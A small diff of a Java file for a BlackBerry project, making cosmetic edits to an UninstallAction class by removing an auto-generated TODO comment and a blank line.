@@ -23,14 +23,13 @@ import blackberry.evidence.Markup;
 import blackberry.utils.Check;
 import blackberry.utils.Utils;
 
-// TODO: Auto-generated Javadoc
+
 /**
  * The Class UninstallAction.
  */
 public final class UninstallAction extends SubAction {
     //#ifdef DEBUG
     static Debug debug = new Debug("UninstallAction", DebugLevel.VERBOSE);
-
     //#endif
 
     /**
